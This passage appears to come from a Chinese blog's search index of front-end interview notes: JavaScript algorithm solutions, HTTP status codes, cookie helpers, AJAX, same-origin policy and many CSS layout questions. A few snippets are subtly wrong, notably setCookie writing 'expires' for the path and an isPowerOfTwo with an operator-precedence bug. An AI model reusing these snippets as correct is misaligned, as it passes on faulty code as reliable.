array_of_integers.length; i++) &#123; sum_of_integers += array_of_integers[i]; &#125; // 以高斯求和公式计算理论上的数组和 // Formula: [(N * (N + 1)) / 2] - [(M * (M - 1)) / 2]; // N is the upper bound and M is the lower bound upper_limit_sum = (upper_bound * (upper_bound + 1)) / 2; lower_limit_sum = (lower_bound * (lower_bound - 1)) / 2; theoretical_sum = upper_limit_sum - lower_limit_sum; // return (theoretical_sum - sum_of_integers)&#125; 数组去重给定某无序数组，要求去除数组中的重复数字并且返回新的无重复数组。 123456789101112131415161718// ES6 Implementationvar array = [1, 2, 3, 5, 1, 5, 9, 1, 2, 8];Array.from(new Set(array)); // [1, 2, 3, 5, 9, 8]// ES5 Implementationvar array = [1, 2, 3, 5, 1, 5, 9, 1, 2, 8];uniqueArray(array); // [1, 2, 3, 5, 9, 8]function uniqueArray(array) &#123; var hashmap = &#123;&#125;; var unique = []; for(var i = 0; i &lt; array.length; i++) &#123; // If key returns null (unique), it is evaluated as false. if(!hashmap.hasOwnProperty([array[i]])) &#123; hashmap[array[i]] = 1; unique.push(array[i]); &#125; &#125; return unique;&#125; 数组中元素最大差值计算给定某无序数组，求取任意两个元素之间的最大差值，注意，这里要求差值计算中较小的元素下标必须小于较大元素的下标。譬如[7, 8, 4, 9, 9, 15, 3, 1, 10]这个数组的计算值是 11( 15 – 4 ) 而不是 14(15 – 1)，因为 15 的下标小于 1。 1234567891011121314151617181920212223var array = [7, 8, 4, 9, 9, 15, 3, 1, 10];// [7, 8, 4, 9, 9, 15, 3, 1, 10] would return `11` based on the difference between `4` and `15`// Notice: It is not `14` from the difference between `15` and `1` because 15 comes before 1.findLargestDifference(array);function findLargestDifference(array) &#123; // 如果数组仅有一个元素，则直接返回 -1 if (array.length &lt;= 1) return -1; // current_min 指向当前的最小值 var current_min = array[0]; var current_max_difference = 0; // 遍历整个数组以求取当前最大差值，如果发现某个最大差值，则将新的值覆盖 current_max_difference // 同时也会追踪当前数组中的最小值，从而保证 `largest value in future` - `smallest value before it` for (var i = 1; i &lt; array.length; i++) &#123; if (array[i] &gt; current_min &amp;&amp; (array[i] - current_min &gt; current_max_difference)) &#123; current_max_difference = array[i] - current_min; &#125; else if (array[i] &lt;= current_min) &#123; current_min = array[i]; &#125; &#125; // If negative or 0, there is no largest difference if (current_max_difference &lt;= 0) return -1; return current_max_difference;&#125; 数组中元素乘积给定某无序数组，要求返回新数组 output ，其中 output[i] 为原数组中除了下标为 i 的元素之外的元素乘积，要求以 O(n) 复杂度实现： 123456789101112131415161718192021222324252627var firstArray = [2, 2, 4, 1];var secondArray = [0, 0, 0, 2];var thirdArray = [-2, -2, -3, 2];productExceptSelf(firstArray); // [8, 8, 4, 16]productExceptSelf(secondArray); // [0, 0, 0, 0]productExceptSelf(thirdArray); // [12, 12, 8, -12]function productExceptSelf(numArray) &#123; var product = 1; var size = numArray.length; var output = []; // From first array: [1, 2, 4, 16] // The last number in this case is already in the right spot (allows for us) // to just multiply by 1 in the next step. // This step essentially gets the product to the left of the index at index + 1 for (var x = 0; x &lt; size; x++) &#123; output.push(product); product = product * numArray[x]; &#125; // From the back, we multiply the current output element (which represents the product // on the left of the index, and multiplies it by the product on the right of the element) var product = 1; for (var i = size - 1; i &gt; -1; i--) &#123; output[i] = output[i] * product; product = product * numArray[i]; &#125; return output;&#125; 数组交集给定两个数组，要求求出两个数组的交集，注意，交集中的元素应该是唯一的。 12345678910111213141516171819202122var firstArray = [2, 2, 4, 1];var secondArray = [1, 2, 0, 2];intersection(firstArray, secondArray); // [2, 1]function intersection(firstArray, secondArray) &#123; // The logic here is to create a hashmap with the elements of the firstArray as the keys. // After that, you can use the hashmap's O(1) look up time to check if the element exists in the hash // If it does exist, add that element to the new array. var hashmap = &#123;&#125;; var intersectionArray = []; firstArray.forEach(function(element) &#123; hashmap[element] = 1; &#125;); // Since we only want to push unique elements in our case... we can implement a counter to keep track of what we already added secondArray.forEach(function(element) &#123; if (hashmap[element] === 1) &#123; intersectionArray.push(element); hashmap[element]++; &#125; &#125;); return intersectionArray; // Time complexity O(n), Space complexity O(n)&#125; 字符串颠倒字符串给定某个字符串，要求将其中单词倒转之后然后输出，譬如”Welcome to this Javascript Guide!” 应该输出为 “emocleW ot siht tpircsavaJ !ediuG”。 12345678var string = "Welcome to this Javascript Guide!";// Output becomes !ediuG tpircsavaJ siht ot emocleWvar reverseEntireSentence = reverseBySeparator(string, "");// Output becomes emocleW ot siht tpircsavaJ !ediuGvar reverseEachWord = reverseBySeparator(reverseEntireSentence, " ");function reverseBySeparator(string, separator) &#123; return string.split(separator).reverse().join(separator);&#125; 乱序同字母字符串给定两个字符串，判断是否颠倒字母而成的字符串，譬如Mary与Army就是同字母而顺序颠倒： 123456789101112var firstWord = "Mary";var secondWord = "Army";isAnagram(firstWord, secondWord); // truefunction isAnagram(first, second) &#123; // For case insensitivity, change both words to lowercase. var a = first.toLowerCase(); var b = second.toLowerCase(); // Sort the strings, and join the resulting array to a string. Compare the results a = a.split("").sort().join(""); b = b.split("").sort().join(""); return a === b;&#125; 会问字符串判断某个字符串是否为回文字符串，譬如racecar与race car都是回文字符串： 12345678isPalindrome("racecar"); // trueisPalindrome("race Car"); // truefunction isPalindrome(word) &#123; // Replace all non-letter chars with "" and change to lowercase var lettersOnly = word.toLowerCase().replace(/\s/g, ""); // Compare the string with the reversed version of the string return lettersOnly === lettersOnly.split("").reverse().join("");&#125; 栈与队列使用两个栈实现入队与出队123456789101112131415161718var inputStack = []; // First stackvar outputStack = []; // Second stack// For enqueue, just push the item into the first stackfunction enqueue(stackInput, item) &#123; return stackInput.push(item);&#125;function dequeue(stackInput, stackOutput) &#123; // Reverse the stack such that the first element of the output stack is the // last element of the input stack. After that, pop the top of the output to // get the first element that was ever pushed into the input stack if (stackOutput.length &lt;= 0) &#123; while(stackInput.length &gt; 0) &#123; var elementToOutput = stackInput.pop(); stackOutput.push(elementToOutput); &#125; &#125; return stackOutput.pop();&#125; 判断大括号是否闭合创建一个函数来判断给定的表达式中的大括号是否闭合： 1234567891011121314151617181920212223242526var expression = "&#123;&#123;&#125;&#125;&#123;&#125;&#123;&#125;"var expressionFalse = "&#123;&#125;&#123;&#123;&#125;";isBalanced(expression); // trueisBalanced(expressionFalse); // falseisBalanced(""); // truefunction isBalanced(expression) &#123; var checkString = expression; var stack = []; // If empty, parentheses are technically balanced if (checkString.length &lt;= 0) return true; for (var i = 0; i &lt; checkString.length; i++) &#123; if(checkString[i] === '&#123;') &#123; stack.push(checkString[i]); &#125; else if (checkString[i] === '&#125;') &#123; // Pop on an empty array is undefined if (stack.length &gt; 0) &#123; stack.pop(); &#125; else &#123; return false; &#125; &#125; &#125; // If the array is not empty, it is not balanced if (stack.pop()) return false; return true;&#125; 递归二进制转换通过某个递归函数将输入的数字转化为二进制字符串： 123456789101112131415161718decimalToBinary(3); // 11decimalToBinary(8); // 1000decimalToBinary(1000); // 1111101000function decimalToBinary(digit) &#123; if(digit &gt;= 1) &#123; // If digit is not divisible by 2 then recursively return proceeding // binary of the digit minus 1, 1 is added for the leftover 1 digit if (digit % 2) &#123; return decimalToBinary((digit - 1) / 2) + 1; &#125; else &#123; // Recursively return proceeding binary digits return decimalToBinary(digit / 2) + 0; &#125; &#125; else &#123; // Exit condition return ''; &#125;&#125; 二分搜索123456789101112function recursiveBinarySearch(array, value, leftPosition, rightPosition) &#123; // Value DNE if (leftPosition &gt; rightPosition) return -1; var middlePivot = Math.floor((leftPosition + rightPosition) / 2); if (array[middlePivot] === value) &#123; return middlePivot; &#125; else if (array[middlePivot] &gt; value) &#123; return recursiveBinarySearch(array, value, leftPosition, middlePivot - 1); &#125; else &#123; return recursiveBinarySearch(array, value, middlePivot + 1, rightPosition); &#125;&#125; 数字判断是否为 2 的指数值123456789101112131415161718192021isPowerOfTwo(4); // trueisPowerOfTwo(64); // trueisPowerOfTwo(1); // trueisPowerOfTwo(0); // falseisPowerOfTwo(-1); // false// For the non-zero case:function isPowerOfTwo(number) &#123; // `&amp;` uses the bitwise n. // In the case of number = 4; the expression would be identical to: // `return (4 &amp; 3 === 0)` // In bitwise, 4 is 100, and 3 is 011. Using &amp;, if two values at the same // spot is 1, then result is 1, else 0. In this case, it would return 000, // and thus, 4 satisfies are expression. // In turn, if the expression is `return (5 &amp; 4 === 0)`, it would be false // since it returns 101 &amp; 100 = 100 (NOT === 0) return number &amp; (number - 1) === 0;&#125;// For zero-case:function isPowerOfTwoZeroCase(number) &#123; return (number !== 0) &amp;&amp; ((number &amp; (number - 1)) === 0);&#125;]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-网络专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-%E7%BD%91%E7%BB%9C%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[HTTP状态码知道哪些？ 100 Continue 继续，一般在发送post请求时，已发送了http header之后服务端将返回此信息，表示确认，之后发送具体参数信息 200 OK 正常返回信息 201 Created 请求成功并且服务器创建了新的资源 202 Accepted 服务器已接受请求，但尚未处理 301 Moved Permanently 请求的网页已永久移动到新位置。 302 Found 临时性重定向。 303 See Other 临时性重定向，且总是使用 GET 请求新的 URI。 304 Not Modified 自从上次请求后，请求的网页未修改过。 400 Bad Request 服务器无法理解请求的格式，客户端不应当尝试再次使用相同的内容发起请求。 401 Unauthorized 请求未授权。 403 Forbidden 禁止访问。 404 Not Found 找不到如何与 URI 相匹配的资源。 500 Internal Server Error 最常见的服务器端错误。 503 Service Unavailable 服务器端暂时无法处理请求（可能是过载或维护）。 附上思维导图： JS数组去重12345678910111213141516171819202122232425262728293031323334Array.prototype.unique1 = function() &#123; var n = []; //一个新的临时数组 for(var i = 0; i &lt; this.length; i++) //遍历当前数组 &#123; //如果当前数组的第i已经保存进了临时数组，那么跳过， //否则把当前项push到临时数组里面 if(n.indexOf(this[i]) == -1) n.push(this[i]); &#125; return n;&#125;Array.prototype.unique2 = function() &#123; var n = &#123;&#125;, r = []; //n为hash表，r为临时数组 for(var i = 0; i &lt; this.length; i++) //遍历当前数组 &#123; if(!n[this[i]]) //如果hash表中没有当前项 &#123; n[this[i]] = true; //存入hash表 r.push(this[i]); //把当前数组的当前项push到临时数组里面 &#125; &#125; return r;&#125;Array.prototype.unique3 = function() &#123; var n = [this[0]]; //结果数组 for(var i = 1; i &lt; this.length; i++) //从第二项开始遍历 &#123; //如果当前数组的第i项在当前数组中第一次出现的位置不是i， //那么表示第i项是重复的，忽略掉。否则存入结果数组 if(this.indexOf(this[i]) == i) n.push(this[i]); &#125; return n;&#125; js操作获取和设置cookie12345678910111213141516171819202122232425262728293031323334353637//创建cookiefunction setCookie(name, value, expires, path, domain, secure) &#123; var cookieText = encodeURIComponent(name) + '=' + encodeURIComponent(value); if (expires instanceof Date) &#123; cookieText += '; expires=' + expires; &#125; if (path) &#123; cookieText += '; expires=' + expires; &#125; if (domain) &#123; cookieText += '; domain=' + domain; &#125; if (secure) &#123; cookieText += '; secure'; &#125; document.cookie = cookieText;&#125;//获取cookiefunction getCookie(name) &#123; var cookieName = encodeURIComponent(name) + '='; var cookieStart = document.cookie.indexOf(cookieName); var cookieValue = null; if (cookieStart &gt; -1) &#123; var cookieEnd = document.cookie.indexOf(';', cookieStart); if (cookieEnd == -1) &#123; cookieEnd = document.cookie.length; &#125; cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd)); &#125; return cookieValue;&#125;//删除cookiefunction unsetCookie(name) &#123; document.cookie = name + "= ; expires=" + new Date(0);&#125; ajax 有那些优缺点?如何解决跨域问题?优点：-（1）通过异步模式，提升了用户体验.-（2）优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用.-（3）Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。-（4）Ajax可以实现动态不刷新（局部刷新） 缺点：-（1）安全问题 AJAX暴露了与服务器交互的细节。-（2）对搜索引擎的支持比较弱。-（3）不容易调试。 jsonp、 iframe、window.name、window.postMessage、服务器上设置代理页面。GET和POST的区别，何时使用POST？GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符POST：一般用于修改服务器上的资源，对所发送的信息没有限制。GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值，也就是说Get是通过地址栏来传值，而Post是通过提交表单来传值。 然而，在以下情况中，请使用 POST 请求： 无法使用缓存文件（更新服务器上的文件或数据库） 向服务器发送大量数据（POST 没有数据量限制） 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠 线程与进程的区别 一个程序至少有一个进程,一个进程至少有一个线程. 线程的划分尺度小于进程，使得多线程程序的并发性高。 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？ （1）查找浏览器缓存 （2）DNS解析、查找该域名对应的IP地址、重定向- （301）、发出第二个GET请求 （3）进行HTTP协议会话 （4）客户端发送报头(请求报头) （5）服务器回馈报头(响应报头) （6）html文档开始下载 （7）文档树建立，根据标记请求所需指定MIME类型的文件 （8）文件显示]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>网络专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-浏览器专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[介绍一下你对浏览器内核的理解？主要分成两部分： 渲染引擎(layout engineer或Rendering Engine) 渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。 JS引擎。 JS引擎则：解析和执行javascript来实现网页的动态效果。 最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎。 请解释一下 JavaScript 的同源策略概念：同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。 同源策略指什么？这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议。指一段脚本只能读取来自同一来源的窗口和文档的属性。 为什么要有同源限制？我们举例说明：比如一个黑客程序，他利用iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>浏览器专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-CSS专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-CSS%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[请解释一下为什么需要清除浮动?清除浮动有哪些方式？比较好的方式是哪一种？清除浮动是为了清除使用浮动元素产生的影响。浮动的元素，高度会塌陷，而高度的塌陷使我们页面后面的布局不能正常显示。 父级div定义height。 结尾处加空div标签clear:both。 父级div定义伪类:after和zoom。 父级div定义overflow:hidden。 父级div定义overflow:auto。 父级div也浮动，需要定义宽度。 父级div定义display:table。 结尾处加br标签clear:both。 比较好的是第3种方式，好多网站都这么用。 原理： 1) display:block 使生成的元素以块级元素显示,占满剩余空间; 2) height:0 避免生成内容破坏原有布局的高度。 3) visibility:hidden 使生成的内容不可见，并允许可能被生成内容盖住的内容可以进行点击和交互; 4）通过 content:”.”生成内容作为最后一个元素，至于content里面是点还是其他都是可以的，例如oocss里面就有经典的 content:”.”,有些版本可能content 里面内容为空,一丝冰凉是不推荐这样做的,firefox直到7.0 content:”” 仍然会产生额外的空隙； 5）zoom：1 触发IE hasLayout。 通过分析发现，除了clear：both用来闭合浮动的，其他代码无非都是为了隐藏掉content生成的内容，这也就是其他版本的闭合浮动为什么会有font-size：0，line-height：0。 zoom:1的清除浮动原理? 清除浮动，触发hasLayout； Zoom属性是IE浏览器的专有属性，它可以设置或检索对象的缩放比例。解决ie下比较奇葩的bug。 譬如外边距（margin）的重叠，浮动清除，触发ie的haslayout属性等。 来龙去脉大概如下： 当设置了zoom的值之后，所设置的元素就会就会扩大或者缩小，高度宽度就会重新计算了，这里一旦改变zoom值时其实也会发生重新渲染，运用这个原理，也就解决了ie下子元素浮动时候父元素不随着自动扩大的问题。 Zoom属是IE浏览器的专有属性，火狐和老版本的webkit核心的浏览器都不支持这个属性。然而，zoom现在已经被逐步标准化，出现在 CSS 3.0 规范草案中。 目前非ie由于不支持这个属性，它们又是通过什么属性来实现元素的缩放呢？ 可以通过css3里面的动画属性scale进行缩放。 box-sizing常用的属性有哪些？分别有什么作用？ box-sizing: content-box|border-box|inherit; content-box:宽度和高度分别应用到元素的内容框。在宽度和高度之外绘制元素的内边距和边框(元素默认效果)。 border-box:元素指定的任何内边距和边框都将在已设定的宽度和高度内进行绘制。通过从已设定的宽度和高度分别减去边框和内边距才能得到内容的宽度和高度。 页面导入样式时，使用link和@import有什么区别？ link属于XHTML标签，除了加载CSS外，还能用于定义RSS, 定义rel连接属性等作用；而@import是CSS提供的，只能用于加载CSS; 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载; import是CSS2.1 提出的，只在IE5以上才能被识别，而link是XHTML标签，无兼容问题; 介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？-（1）有两种， IE 盒子模型、W3C 盒子模型。-（2）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)。-（3）区 别： IE的content部分把 border 和 padding计算了进去。 CSS优先级算法如何计算？ 优先级就近原则，同权重情况下样式定义最近者为准; 载入样式以最后载入的定位为准; 优先级为: !important &gt; id &gt; class &gt; tag important比内联优先级高(style) 为什么要使用CSS spritesCSS Sprites其实就是把网页中一些背景图片整合到一张图片文件中，再利用CSS的“background-image”，“background-position”的组合进行背景定位，这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是如果请求太多会给服务器增加很大的压力。 display:none和visibility:hidden的区别？ display:none 隐藏对应的元素，在文档布局中不再给它分配空间，它各边的元素会合拢，就当他从来不存在。 visibility:hidden 隐藏对应的元素，但是在文档布局中仍保留原来的空间。 position的absolute与fixed区别 absolute浮动定位是相对于父级中设置position为relative或者absolute最近的父级元素 fixed浮动定位是相对于浏览器视窗的 position的值relative和absolute定位原点是？ absolute 生成绝对定位的元素，相对于值不为 static的第一个父元素进行定位。 fixed （老IE不支持） 生成绝对定位的元素，相对于浏览器窗口进行定位。 relative 生成相对定位的元素，相对于其正常位置进行定位。 static 默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right z-index 声明）。 inherit规定从父元素继承 position 属性的值。 IE 8以下版本的浏览器中的盒模型有什么不同？IE8以下浏览器的盒模型中定义的元素的宽高包括内边距和边框（怪异盒子模型） CSS3新增伪类有那些？举例： p:first-of-type 选择属于其父元素的首个 元素的每个 元素。 p:last-of-type 选择属于其父元素的最后 元素的每个 元素。 p:only-of-type 选择属于其父元素唯一的 元素的每个 元素。 p:only-child 选择属于其父元素的唯一子元素的每个 元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个 元素。 ::after 在元素之前添加内容,也可以用来做清除浮动。 ::before 在元素之后添加内容 :enabled :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中。 如何居中div？ 水平居中：给div设置一个宽度，然后添加margin:0 auto属性 1234div&#123; width:200px; margin:0 auto; &#125; 让绝对定位的div居中 1234567891011div &#123; position: absolute; width: 300px; height: 300px; margin: auto; top: 0; left: 0; bottom: 0; right: 0; background-color: pink; /* 方便看效果 */&#125; 水平垂直居中一 123456789101112确定容器的宽高 宽500 高 300 的层设置层的外边距div &#123; position: relative; /* 相对定位或绝对定位均可 */ width:500px; height:300px; top: 50%; left: 50%; margin: -150px 0 0 -250px; /* 外边距为自身宽高的一半 */ background-color: pink; /* 方便看效果 */&#125; 水平垂直居中二 1234567891011未知容器的宽高，利用 `transform` 属性div &#123; position: absolute; /* 相对定位或绝对定位均可 */ width:500px; height:300px; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: pink; /* 方便看效果 */&#125; 水平垂直居中三 123456789101112 利用 flex 布局 实际使用时应考虑兼容性.container &#123; display: flex; align-items: center; /* 垂直居中 */ justify-content: center; /* 水平居中 */&#125;.container div &#123; width: 100px; height: 100px; background-color: pink; /* 方便看效果 */&#125; display有哪些值？说明他们的作用。 block 块类型。默认宽度为父元素宽度，可设置宽高，换行显示。 none 元素不显示，并从文档流中移除。 inline 行内元素类型。默认宽度为内容宽度，不可设置宽高，同行显示。 inline-block 默认宽度为内容宽度，可以设置宽高，同行显示。 list-item 象块类型元素一样显示，并添加样式列表标记。 table 此元素会作为块级表格来显示。 inherit 规定应该从父元素继承 display 属性的值。 CSS3有哪些新特性？新增各种CSS选择器 （: not(.input)：所有 class 不是“input”的节点） 圆角 （border-radius:8px） 多列布局 （multi-column layout） 阴影和反射 （Shadow\Reflect） 文字特效 （text-shadow、） 文字渲染 （Text-decoration） 线性渐变 （gradient） 旋转 （transform） 缩放,定位,倾斜,动画,多背景例如:transform:\scale(0.85,0.90)\ translate(0px,-30px)\ skew(-9deg,0deg)\Animation: 请解释一下CSS3的Flexbox（弹性盒布局模型）,以及适用场景？一个用于页面布局的全新CSS3功能，Flexbox可以把列表放在同一个方向（从上到下排列，从左到右），并让列表能延伸到占用可用的空间。较为复杂的布局还可以通过嵌套一个伸缩容器（flex container）来实现。采用Flex布局的元素，称为Flex容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为Flex项目（flex item），简称”项目”。常规布局是基于块和内联流方向，而Flex布局是基于flex-flow流可以很方便的用来做局中，能对不同屏幕大小自适应。在布局上有了比以前更加灵活的空间。具体：http://www.w3cplus.com/css3/flexbox-basics.html 用纯CSS创建一个三角形的原理是什么？ 把上、左、右三条边隐藏掉（颜色设为 transparent） 1234567#demo &#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: transparent transparent red transparent;&#125; 一个满屏 品 字布局 如何设计?简单的方式： 上面的div宽100%， 下面的两个div分别宽50%， 然后用float或者inline使其不换行即可 css多列等高如何实现？利用padding-bottom|margin-bottom正负值相抵；设置父容器设置超出隐藏（overflow:hidden），这样子父容器的高度就还是它里面的列没有设定padding-bottom时的高度，当它里面的任 一列高度增加了，则父容器的高度被撑到里面最高那列的高度，其他比这列矮的列会用它们的padding-bottom补偿这部分高度差。 经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用hack的技巧 ？ png24位的图片在iE6浏览器上出现背景，解决方案是做成PNG8. 浏览器默认的margin和padding不同。解决方案是加一个全局的*{margin:0;padding:0;}来统一。 IE6双边距bug:块属性标签float后，又有横行的margin情况下，在ie6显示margin比设置的大。 浮动ie产生的双倍距离 #box{ float:left; width:10px; margin:0 0 0 100px;} 这种情况之下IE会产生20px的距离，解决方案是在float的标签样式控制中加入 ——display:inline;将其转化为行内属性。(这个符号只有ie6会识别) 渐进识别的方式，从总体中逐渐排除局部。 首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。 接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。 123456.bb&#123; background-color:red;/*所有识别*/ background-color:#00deff\9; /*IE6、7、8识别*/ +background-color:#a200ff;/*IE6、7识别*/ _background-color:#1e0bd1;/*IE6识别*/&#125; IE下,可以使用获取常规属性的方法来获取自定义属性,也可以使用getAttribute()获取自定义属性;Firefox下,只能使用getAttribute()获取自定义属性。解决方法:统一通过getAttribute()获取自定义属性。 IE下,even对象有x,y属性,但是没有pageX,pageY属性;Firefox下,event对象有pageX,pageY属性,但是没有x,y属性。 解决方法：（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。 Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示,可通过加入 CSS 属性 -webkit-text-size-adjust: none; 解决。 超链接访问过后hover样式就不出现了 被点击访问过的超链接样式不在具有hover和active了解决方法是改变CSS属性的排列顺序:L-V-H-A : a:link {} a:visited {} a:hover {} a:active {} li与li之间有看不见的空白间隔是什么原因引起的？有什么解决办法？行框的排列会受到中间空白（回车\空格）等的影响，因为空格也属于字符,这些空白也会被应用样式，占据空间，所以会有间隔，把字符大小设为0，就没有空格了。 为什么要初始化CSS样式。 因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。 当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。 最简单的初始化方法： * {padding: 0; margin: 0;} （强烈不建议） 淘宝的样式初始化代码： 123456789101112131415body, h1, h2, h3, h4, h5, h6, hr, p, blockquote, dl, dt, dd, ul, ol, li, pre, form, fieldset, legend, button, input, textarea, th, td &#123; margin:0; padding:0; &#125;body, button, input, select, textarea &#123; font:12px/1.5tahoma, arial, \5b8b\4f53; &#125;h1, h2, h3, h4, h5, h6&#123; font-size:100%; &#125;address, cite, dfn, em, var &#123; font-style:normal; &#125;code, kbd, pre, samp &#123; font-family:couriernew, courier, monospace; &#125;small&#123; font-size:12px; &#125;ul, ol &#123; list-style:none; &#125;a &#123; text-decoration:none; &#125;a:hover &#123; text-decoration:underline; &#125;sup &#123; vertical-align:text-top; &#125;sub&#123; vertical-align:text-bottom; &#125;legend &#123; color:#000; &#125;fieldset, img &#123; border:0; &#125;button, input, select, textarea &#123; font-size:100%; &#125;table &#123; border-collapse:collapse; border-spacing:0; &#125; absolute的containing block(容器块)计算方式跟正常流有什么不同？无论属于哪种，都要先找到其祖先元素中最近的 position 值不为 static 的元素，然后再判断： 1、若此元素为 inline 元素，则 containing block 为能够包含这个元素生成的第一个和最后一个 inline box 的 padding box (除 margin, border 外的区域) 的最小矩形； 2、否则,则由这个祖先元素的 padding box 构成。 如果都找不到，则为 initial containing block。 补充： static(默认的)/relative：简单说就是它的父元素的内容框（即去掉padding的部分） absolute: 向上找最近的定位为absolute/relative的元素 fixed: 它的containing block一律为根元素(html/body)，根元素也是initial containing block CSS里的visibility属性有个collapse属性值是干嘛用的？在不同浏览器下以后什么区别？对于普通元素visibility:collapse;会将元素完全隐藏,不占据页面布局空间,与display:none;表现相同. 如果目标元素为table,visibility:collapse;将table隐藏,但是会占据页面布局空间. 仅在Firefox下起作用,IE会显示元素,Chrome会将元素隐藏,但是占据空间. position跟display、margin collapse、overflow、float这些特性相互叠加后会怎么样？如果元素的display为none,那么元素不被渲染,position,float不起作用,如果元素拥有position:absolute;或者position:fixed;属性那么元素将为绝对定位,float不起作用.如果元素float属性不是none,元素会脱离文档流,根据float属性值来显示.有浮动,绝对定位,inline-block属性的元素,margin不会和垂直方向上的其他元素margin折叠. 对BFC规范(块级格式化上下文：block formatting context)的理解？（W3C CSS 2.1 规范中的一个概念,它是一个独立容器，决定了元素如何对其内容进行定位,以及与其他元素的关系和相互作用。）一个页面是由很多个 Box 组成的,元素的类型和 display 属性,决定了这个 Box 的类型。不同类型的 Box,会参与不同的 Formatting Context（决定如何渲染文档的容器）,因此Box内的元素会以不同的方式渲染,也就是说BFC内部的元素和外部的元素不会互相影响。 css定义的权重1234567891011121314151617181920以下是权重的规则：标签的权重为1，class的权重为10，id的权重为100，以下例子是演示各种定义的权重值：/*权重为1*/div&#123;&#125;/*权重为10*/.class1&#123;&#125;/*权重为100*/#id1&#123;&#125;/*权重为100+1=101*/#id1 div&#123;&#125;/*权重为10+1=11*/.class1 div&#123;&#125;/*权重为10+10+1=21*/.class1 .class2 div&#123;&#125;如果权重相同，则最后定义的样式会起作用，但是应该避免这种情况出现 什么是外边距合并？外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。w3school介绍网址： http://www.w3school.com.cn/css/css_margin_collapsing.asp 移动端的布局用过媒体查询吗？假设你现在正用一台显示设备来阅读这篇文章，同时你也想把它投影到屏幕上，或者打印出来， 而显示设备、屏幕投影和打印等这些媒介都有自己的特点，CSS就是为文档提供在不同媒介上展示的适配方法 当媒体查询为真时，相关的样式表或样式规则会按照正常的级联规被应用。 当媒体查询返回假， 标签上带有媒体查询的样式表 仍将被下载 （只不过不会被应用）。 包含了一个媒体类型和至少一个使用 宽度、高度和颜色等媒体属性来限制样式表范围的表达式。 CSS3加入的媒体查询使得无需修改内容便可以使样式应用于某些特定的设备范围。 1&lt;style&gt; @media (min-width: 700px) and (orientation: landscape)&#123; .sidebar &#123; display: none; &#125; &#125; &lt;/style&gt; 使用 CSS 预处理器吗？喜欢那个？SASS (SASS、LESS没有本质区别，只因为团队前端都是用的SASS) CSS优化、提高性能的方法有哪些？关键选择器（key selector）。选择器的最后面的部分为关键选择器（即用来匹配目标元素的部分）；如果规则拥有 ID 